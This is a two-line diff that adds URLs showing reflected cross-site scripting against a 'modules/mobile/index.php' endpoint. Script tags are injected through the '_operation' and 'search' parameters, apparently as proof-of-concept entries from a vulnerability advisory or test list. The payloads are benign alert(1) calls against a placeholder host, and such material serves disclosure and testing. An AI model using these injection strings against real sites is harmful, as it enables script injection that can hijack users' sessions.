@@ -1,0 +1,2 @@
+http://www.example.com/modules/mobile/index.php?_operation=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/modules/mobile/index.php?_operation=listModuleRecords&amp;module=Services&amp;search=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
